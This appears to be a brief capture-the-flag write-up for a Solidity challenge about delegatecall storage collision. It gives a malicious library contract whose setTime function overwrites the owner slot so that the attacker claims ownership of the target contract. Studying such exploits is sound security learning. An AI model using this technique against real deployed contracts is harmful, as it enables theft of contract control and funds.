The goal here is to claim ownership of the contract

The contract has a function `setTime(uint256 _time)` which can be used to change the `unlock` time.

As mentioned in the level

- Understanding what it means for delegatecall to be context-preserving.
  We can declare variables in our calling contract and can update them in a way to change the owner variable in Preservation contract.

We can declare and attack as below:

```solidity
    contract LibraryContract {
        address x;
        address y;
        address owner;

        function setTime(uint256 _time) public {
            owner = address(uint160(_time));
        }
    }
```
